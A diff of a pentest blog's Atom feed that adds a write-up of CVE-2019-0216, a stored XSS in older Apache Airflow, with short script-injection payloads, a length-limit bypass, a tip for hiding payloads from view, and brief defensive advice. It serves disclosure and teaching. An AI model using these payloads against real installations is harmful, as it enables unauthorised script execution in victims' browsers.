@@ -1,4 +1,57 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-16T10:37:53-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">-pentest notes-</title><subtitle>some security-related notes from the field, hopefully of use to other attackers/defenders...</subtitle><entry><title type="html">exploiting apache tomcat via jmx</title><link href="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html" rel="alternate" type="text/html" title="exploiting apache tomcat via jmx" /><published>2020-06-15T00:00:00-06:00</published><updated>2020-06-15T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html">&lt;h1 id=&quot;motivation&quot;&gt;motivation&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-16T21:12:33-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">-pentest notes-</title><subtitle>some security-related notes from the field, hopefully of use to other attackers/defenders...</subtitle><entry><title type="html">cve-2019-0216: stored xss in apache airflow</title><link href="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html" rel="alternate" type="text/html" title="cve-2019-0216: stored xss in apache airflow" /><published>2020-06-16T00:00:00-06:00</published><updated>2020-06-16T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html">&lt;h1 id=&quot;motivation&quot;&gt;motivation&lt;/h1&gt;
+
+&lt;p&gt;A while back I (and several other researchers concurrently) reported CVE-2019-0216 to Apache – a stored XSS in Apache Airflow. Airflow is a workflow orchestration platform, and isn’t uncommon to come across on an engagement. If you find an older installation there is a fun opportunity for getting stored XSS.&lt;/p&gt;
+
+&lt;h1 id=&quot;prerequisites&quot;&gt;prerequisites&lt;/h1&gt;
+
+&lt;p&gt;If the installation is out-of-date (&amp;lt; 1.10.3 according to Apache), it is theoretically vulnerable (though I can’t currently reproduce against manual out-of-date installs from PyPI due to some severe dependency drift). In any case, Airflow suffered from this vulnerability in late February 2019 when it was reported to Apache.&lt;/p&gt;
+
+&lt;p&gt;Additionally, the CVE describes the vuln as being possibly exploited by a ‘malicious admin’, which is technically true, however auth is disabled by default. So if auth has been enabled, you’ll need credentials to perform the attack.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploiting&quot;&gt;exploiting&lt;/h1&gt;
+
+&lt;p&gt;Visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/dagrun/&lt;/code&gt; endpoint (by default not password protected).&lt;/p&gt;
+
+&lt;p&gt;If there aren’t a few “DAG runs” listed, create a few, giving them any ID, and leave the state as ‘running’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/airflow-bogus-ids.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Back on the listing screen, you’ll notice that you can click on the ‘running’ status indicator and input HTML.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/airflow-inject-script.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The input is limited to 50 characters, which I believe was intended as an XSS defense, however this is easily overcome.&lt;/p&gt;
+
+&lt;p&gt;If you own a short domain, you can use the protocol inheritance and a short script name to just directly include your payload. Something like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script src=&quot;//127.0.0.1/j.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Or, using variables, string concatenation, etc., you can glue a script together in separate rows of the table.&lt;/p&gt;
+
+&lt;p&gt;A simple example would be something like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;_a=&quot;https://b4ny4n.github.io&quot;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;… and then&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.location=_a&amp;lt;/script&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you save the rows, they’re properly escaped into the page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/airflow-pre-render.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But on a fresh load of the page the content will be directly injected into the DOM:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/airflow-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this point you can drop your favorite xss payload. Depending on the state of the airflow installation (there could be many, many DAGs) you can also hide your payloads throughout rows below the page fold to be less obvious.&lt;/p&gt;
+
+&lt;h1 id=&quot;if-youre-defending&quot;&gt;if you’re defending&lt;/h1&gt;
+
+&lt;p&gt;These kinds of issues are best prevented by a good scanning + patching cadence and basic password hygiene (like enabling authentication, and requiring strong passwords).&lt;/p&gt;</content><author><name></name></author><summary type="html">motivation</summary></entry><entry><title type="html">exploiting apache tomcat via jmx</title><link href="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html" rel="alternate" type="text/html" title="exploiting apache tomcat via jmx" /><published>2020-06-15T00:00:00-06:00</published><updated>2020-06-15T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html">&lt;h1 id=&quot;motivation&quot;&gt;motivation&lt;/h1&gt;
 
 &lt;p&gt;Often on internal network pentests, you’ll come across an Apache Tomcat server. Usually access to the manager endpoint is restricted by network controls (requiring localhost access for example), but sometimes it’s left open.&lt;/p&gt;
 
